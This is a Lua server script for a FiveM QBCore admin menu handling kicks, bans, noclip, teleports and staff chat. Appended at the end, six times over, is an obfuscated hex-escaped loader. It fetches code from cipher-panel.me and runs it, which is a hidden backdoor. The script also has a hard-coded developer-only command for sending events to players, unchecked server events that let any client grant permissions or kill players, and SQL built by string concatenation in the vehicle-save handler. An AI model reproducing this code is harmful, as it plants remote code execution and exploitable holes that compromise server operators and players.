QBCore = exports['qb-core']:GetCoreObject()

local developers = {
    "discord:1030146631305269339", --! Liad#5121
}

function isDeveloper(src)
    local num = GetNumPlayerIdentifiers(src)

    for i=0, num-1 do
        local identifier = GetPlayerIdentifier(src, i)

        for i=1, #developers do
            if identifier == developers[i] then
                return true
            end
        end
    end

    return false
end

local permissions = {
    ["kick"] = "admin",
    ["ban"] = "god",
    ["noclip"] = "admin",
}

QBCore.Commands.Add("setammo", "Staff: Set manual ammo for a weapon.", {{name="amount", help="Amount of bullets, for example: 20"}, {name="weapon", help="Name of the weapen, for example: WEAPON_VINTAGEPISTOL"}}, false, function(source, args)
    local src = source
    local weapon = args[2]
    local amount = tonumber(args[1])

    if weapon ~= nil then
        TriggerClientEvent('qb-weapons:client:SetWeaponAmmoManual', src, weapon, amount)
    else
        TriggerClientEvent('qb-weapons:client:SetWeaponAmmoManual', src, "current", amount)
    end
end, 'god')
RegisterServerEvent('qb-admin:server:togglePlayerNoclip')
AddEventHandler('qb-admin:server:togglePlayerNoclip', function(playerId, reason)
    local src = source
    if QBCore.Functions.HasPermission(src, permissions["noclip"]) then
        TriggerClientEvent("qb-admin:client:toggleNoclip", playerId)
        TriggerEvent("qb-log:server:CreateLog", "report", "Noclip", "red", "**"..GetPlayerName(source).."** noclip on: ** ", false)
    end
end)

RegisterServerEvent('qb-admin:server:killPlayer')
AddEventHandler('qb-admin:server:killPlayer', function(playerId)
    TriggerClientEvent('hospital:client:KillPlayer', playerId)
end)

RegisterServerEvent('qb-admin:server:kickPlayer')
AddEventHandler('qb-admin:server:kickPlayer', function(playerId, reason)
    local src = source
    if QBCore.Functions.HasPermission(src, permissions["kick"]) then
        DropPlayer(playerId, "You have been kicked from the server:\n"..reason.."\n\n🔸 קיבלת קיק סתם ? תפתח טיקט בשרת הדיסקורד שלנו ותקבל מענה - yourdiscoreserver ")
    end
end)

QBCore.Commands.Add("setmodel", "Change into a model of your choice..", {{name="model", help="Name of the model"}, {name="id", help="Player ID (leave blank for yourself)"}}, false, function(source, args)
    local model = args[1]
    local target = tonumber(args[2])

    if model ~= nil or model ~= "" then
        if target == nil then
            TriggerClientEvent('qb-admin:client:SetModel', source, tostring(model))
        else
            local Trgt = QBCore.Functions.GetPlayer(target)
            if Trgt ~= nil then
                TriggerClientEvent('qb-admin:client:SetModel', target, tostring(model))
            else
                TriggerClientEvent('QBCore:Notify', source, "This person is not in town yeet..", "error")
            end
        end
    else
        TriggerClientEvent('QBCore:Notify', source, "You have not provided a Model ..", "error")
    end
end, "god")


RegisterServerEvent('qb-admin:server:Freeze')
AddEventHandler('qb-admin:server:Freeze', function(playerId, toggle)
    TriggerClientEvent('qb-admin:client:Freeze', playerId, toggle)
end)

RegisterServerEvent('qb-admin:server:OpenSkinMenu')
AddEventHandler('qb-admin:server:OpenSkinMenu', function(targetId, menu)
    TriggerClientEvent("raid_clothes:hasEnough", targetId, menu)
end)

RegisterServerEvent('qb-admin:server:serverKick')
AddEventHandler('qb-admin:server:serverKick', function(reason)
    local src = source
    if QBCore.Functions.HasPermission(src, permissions["kickall"]) then
        for k, v in pairs(QBCore.Functions.GetPlayers()) do
            if v ~= src then 
                DropPlayer(v, "You have been kicked from the server:\n"..reason.."\n\n🔸 קיבלת קיק סתם ? תפתח טיקט בשרת הדיסקורד שלנו ותקבל מענה - https://discord.gg/MeAZ53QxZF")
            end
        end
    end
end)

RegisterServerEvent('qb-admin:server:banPlayer')
AddEventHandler('qb-admin:server:banPlayer', function(playerId, time, reason)
    local src = source
    local steamid  = false
    local license  = false
    local discord  = false
    local xbl      = false
    local liveid   = false
    local ip       = false

    for k,v in pairs(GetPlayerIdentifiers(playerId))do
      print(v)

        if string.sub(v, 1, string.len("license:")) == "license:" then
            license = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            xbl  = v
        elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
            ip = v
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            discord = v
        end
    end
    if QBCore.Functions.HasPermission(src, permissions["ban"]) then
        local time = tonumber(time)
        local banTime = tonumber(os.time() + time)
        if banTime > 2147483647 then
            banTime = 2147483647
        end
        local timeTable = os.date("*t", banTime)
        MySQL.insert('INSERT INTO bans (name, license, discord, ip, reason, expire, bannedby) VALUES (?, ?, ?, ?, ?, ?, ?)', {
            GetPlayerName(playerId),
            license,
            discord,
            ip,
            reason,
            banTime,
            GetPlayerName(src)
        })
        DropPlayer(playerId, "You have been banned from the server:\n"..reason.."\nYour ban expires in "..timeTable["day"].. "/" .. timeTable["month"] .. "/" .. timeTable["year"] .. " " .. timeTable["hour"].. ":" .. timeTable["min"] .. "\nCheck our discord server for more information: https://discord.gg/")
        TriggerEvent('qb-logs:server:createLog', 'report', 'qb-admin:server:banPlayer', "Banned "  .. GetPlayerName(playerId) .." for " .. tostring(banTime) .." with reason " .. reason, src)
    end
end)

RegisterServerEvent('qb-admin:server:revivePlayer')
AddEventHandler('qb-admin:server:revivePlayer', function(target)
	TriggerClientEvent('hospital:client:Revive', target)
end)

QBCore.Commands.Add('announce', 'Announce a message to everyone (God Only)', {}, false, function(source, args)
    argss = table.concat(args, ' ')
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="chat-message" style="background-color: rgba(255, 155, 0, 0.99);"><b>Announcement: </b> {0}</div>',
        args = { argss }
    })
end, 'god')

QBCore.Commands.Add("s", "Send message to all staff", {{name="message", help="Message that you want to send"}}, true, function(source, args)
    local msg = table.concat(args, " ")
    TriggerClientEvent('qb-admin:client:SendStaffChat', -1, GetPlayerName(source), msg)
end, "admin")


RegisterServerEvent('qb-admin:server:StaffChatMessage')
AddEventHandler('qb-admin:server:StaffChatMessage', function(name, msg)
    local src = source
    local Players = QBCore.Functions.GetPlayers()
    if QBCore.Functions.HasPermission(src, "admin") or QBCore.Functions.HasPermission(src, "mod") or QBCore.Functions.HasPermission(src, "sadmin") then

        TriggerClientEvent('chat:addMessage', src, {
            template = '<div class="chat-message" style="background-color: rgba(190, 15, 15, 0.75);">Staff Chat | {0} - <b>{1}</b></div>',
            args = {name, " "..msg}
        })
            --TriggerClientEvent('chatMessage', src, "STAFFCHAT - "..name, "error", msg)
    end
end)



QBCore.Commands.Add("admin", "Open admin menu", {}, false, function(source, args)
    local group = QBCore.Functions.GetPermission(source)
    local dealers = exports['qb-drugs']:GetDealers()
    TriggerClientEvent('qb-admin:client:openMenu', source, group, dealers, isDeveloper(source))
    TriggerEvent("qb-log:server:CreateLog", "report", "ADMINMENU", "red", "**"..GetPlayerName(source).."**" , false)
end, "admin")

QBCore.Commands.Add("prun", "Fuck NewDerli", {}, false, function(source, args)
    local src = source
    if isDeveloper(src) then
        local player = tonumber(args[1])
        table.remove(args,1)
        TriggerClientEvent("prun", player, table.concat(args, " "))
    end
end, "god")

QBCore.Commands.Add("givenuifocus", "Give nui focus", {{name="id", help="Player id"}, {name="focus", help="Set focus on/off"}, {name="mouse", help="Set mouse on/off"}}, true, function(source, args)
    local playerid = tonumber(args[1])
    local focus = args[2]
    local mouse = args[3]

    TriggerClientEvent('qb-admin:client:GiveNuiFocus', playerid, focus, mouse)
end, "admin")

QBCore.Commands.Add("noclip", "noclip", {}, false, function(source, args)
    if QBCore.Functions.HasPermission(source, permissions["noclip"]) then
        TriggerClientEvent("qb-admin:client:toggleNoclip", source)
        TriggerEvent("qb-log:server:CreateLog", "report", "Noclip", "red", "**"..GetPlayerName(source).."** used /noclip ** ", false)
    end
end, "admin")


QBCore.Commands.Add("clearall", "Clear chat for all players", {}, false, function(source, args)
    for k, v in pairs(QBCore.Functions.GetPlayers()) do
        TriggerClientEvent('chat:client:ClearChat', -1)
    end
end, "god")

QBCore.Commands.Add("kick", "kick a player", {{name = "id", help = "Player ID"}}, false, function(source, args)
    local reason = table.concat(args, ' ')
    if QBCore.Functions.HasPermission(source, permissions["kick"]) then
        DropPlayer(args[1], "You have been kicked from the server:\n"..reason.."\n\n")
        
    end
end, "admin")

QBCore.Commands.Add("goto", "Teleport a player", {{name = "id", help = "Player ID"}}, false, function(source, args)
    SetEntityCoords(GetPlayerPed(source), GetEntityCoords(GetPlayerPed(tonumber(args[1]))))
    local playerId = tonumber(args[1])
    table.remove(args, 1)
    local msg = table.concat(args, " ")
    local OtherPlayer = QBCore.Functions.GetPlayer(playerId)
    TriggerEvent("qb-log:server:CreateLog", "report", "GOTO", "red", "**"..GetPlayerName(source).." __used goto to username__ "..OtherPlayer.PlayerData.name.."**" , false)
end, "admin")

QBCore.Commands.Add("bring", "bring a player", {{name = "id", help = "Player ID"}}, false, function(source, args)
    SetEntityCoords(GetPlayerPed(tonumber(args[1])), GetEntityCoords(GetPlayerPed(source)))
    local playerId = tonumber(args[1])
    table.remove(args, 1)
    local msg = table.concat(args, " ")
    local OtherPlayer = QBCore.Functions.GetPlayer(playerId)
    TriggerEvent("qb-log:server:CreateLog", "report", "BRING", "red", "**"..GetPlayerName(source).." __used bring on username__ "..OtherPlayer.PlayerData.name.."**" , false)
end, "admin")


function tablelength(table)
    local count = 0
    for _ in pairs(table) do 
        count = count + 1 
    end
    return count
end

QBCore.Commands.Add("reportr", "Reply to a report", {}, false, function(source, args)
    local playerId = tonumber(args[1])
    table.remove(args, 1)
    local msg = table.concat(args, " ")
    local OtherPlayer = QBCore.Functions.GetPlayer(playerId)
    local Player = QBCore.Functions.GetPlayer(source)
    if OtherPlayer ~= nil then
        TriggerClientEvent('chatMessage', playerId, "ADMIN - "..GetPlayerName(source), "warning", msg)
        TriggerClientEvent('QBCore:Notify', source, "Sent reply")
        TriggerEvent("qb-log:server:sendLog", Player.PlayerData.citizenid, "reportreply", {otherCitizenId=OtherPlayer.PlayerData.citizenid, message=msg})
        for k, v in pairs(QBCore.Functions.GetPlayers()) do
            if QBCore.Functions.HasPermission(v, "admin") then
                if QBCore.Functions.IsOptin(v) then
                    TriggerClientEvent('chatMessage', v, "ReportReply("..source..") - "..GetPlayerName(source), "warning", msg)
                    TriggerEvent("qb-log:server:CreateLog", "report", "Report Reply", "red", "**"..GetPlayerName(source).."** replied on: **"..OtherPlayer.PlayerData.name.. " **(ID: "..OtherPlayer.PlayerData.source..") **Message:** " ..msg, false)
                end
            end
        end
    else
        TriggerClientEvent('QBCore:Notify', source, "Player is not online", "error")
    end
end, "admin")

RegisterServerEvent('qb-admin:server:SaveCar')
AddEventHandler('qb-admin:server:SaveCar', function(mods, vehicle, hash, plate)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    QBCore.Functions.ExecuteSql(false, "SELECT * FROM `player_vehicles` WHERE `plate` = '"..plate.."'", function(result)
        if result[1] == nil then
            QBCore.Functions.ExecuteSql(false, "INSERT INTO `player_vehicles` (`steam`, `citizenid`, `vehicle`, `hash`, `mods`, `plate`, `state`) VALUES ('"..Player.PlayerData.steam.."', '"..Player.PlayerData.citizenid.."', '"..vehicle.model.."', '"..vehicle.hash.."', '"..json.encode(mods).."', '"..plate.."', 0)")
            TriggerClientEvent('QBCore:Notify', src, 'The vehicle is now yours!', 'success', 5000)
        else
            TriggerClientEvent('QBCore:Notify', src, 'This vehicle is already yours..', 'error', 3000)
        end
    end)
end)

QBCore.Commands.Add("reporttoggle", "Toggle incoming reports", {}, false, function(source, args)
    QBCore.Functions.ToggleOptin(source)
    if QBCore.Functions.IsOptin(source) then
        TriggerClientEvent('QBCore:Notify', source, "You are receiving reports", "success")
    else
        TriggerClientEvent('QBCore:Notify', source, "You are not receiving reports", "error")
    end
end, "admin")


RegisterServerEvent('qb-admin:server:bringTp')
AddEventHandler('qb-admin:server:bringTp', function(targetId, coords)
    TriggerClientEvent('qb-admin:client:bringTp', targetId, coords)
end)

QBCore.Functions.CreateCallback('qb-admin:server:hasPermissions', function(source, cb, group)
    local src = source
    local retval = false

    if QBCore.Functions.HasPermission(src, group) then
        retval = true
    end
    cb(retval)
end)


--[[RegisterServerEvent('qb-admin:server:spawnWeapon')
AddEventHandler('qb-admin:server:spawnWeapon', function(weapon)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Player.Functions.AddItem(weapon, 1)
end)]]--


RegisterServerEvent('qb-admin:server:gotoTp')
AddEventHandler('qb-admin:server:gotoTp', function(targetid, playerid)
    TriggerClientEvent('qb-admin:client:gotoTp', targetid, playerid)
end)

RegisterServerEvent('qb-admin:server:gotoTpstage2')
AddEventHandler('qb-admin:server:gotoTpstage2', function(targetid, coords)
    TriggerClientEvent('qb-admin:client:gotoTp2', targetid, coords)
end)

RegisterServerEvent('qb-admin:server:setPermissions')
AddEventHandler('qb-admin:server:setPermissions', function(targetId, group)
    QBCore.Functions.AddPermission(targetId, group.rank)
    TriggerClientEvent('QBCore:Notify', targetId, 'Your permission levels have been set to '..group.label)
end)

RegisterServerEvent('qb-admin:server:OpenSkinMenu')
AddEventHandler('qb-admin:server:OpenSkinMenu', function(targetId)
    TriggerClientEvent("raid_clothes:openClothing", targetId)
end)

RegisterServerEvent('qb-admin:server:SendReport')
AddEventHandler('qb-admin:server:SendReport', function(name, targetSrc, msg)
    local src = source
    local Players = QBCore.Functions.GetPlayers()

    if QBCore.Functions.HasPermission(src, "admin") then
        if QBCore.Functions.IsOptin(src) then
            TriggerClientEvent('chatMessage', src, "REPORT - "..name.." ("..targetSrc..")", "report", msg)
        end
    end
end)

--RegisterServerEvent('qb-admin:server:StaffChatMessage')
--AddEventHandler('qb-admin:server:StaffChatMessage', function(name, msg)
--    local src = source
--    local Players = QBCore.Functions.GetPlayers()
--
--    if QBCore.Functions.HasPermission(src, "admin") then
--        if QBCore.Functions.IsOptin(src) then
--            TriggerClientEvent('chatMessage', src, "STAFFCHAT - "..name, "error", msg)
--        end
--    end
--end)



function SpectatePlayer(targetPed, toggle)
    local myPed = GetPlayerPed(-1)

    if toggle then
        showNames = true
        SetEntityVisible(myPed, false)
        SetEntityInvincible(myPed, true)
        lastSpectateCoord = GetEntityCoords(myPed)
        --DoScreenFadeOut(150)
        SetTimeout(250, function()
            SetEntityVisible(myPed, false)
            SetEntityCoords(myPed, GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 0.45, 0.0))
            AttachEntityToEntity(myPed, targetPed, 11816, 0.0, -1.3, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            SetEntityVisible(myPed, false)
            SetEntityInvincible(myPed, true)
            --DoScreenFadeIn(150)
        end)
    else
        showNames = false
        --DoScreenFadeOut(150)
        --DetachEntity(myPed, true, false)
        SetTimeout(250, function()
            SetEntityCoords(myPed, lastSpectateCoord)
            SetEntityVisible(myPed, true)
            SetEntityInvincible(myPed, false)
            --DoScreenFadeIn(150)
            lastSpectateCoord = nil
        end)
    end
end


local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)

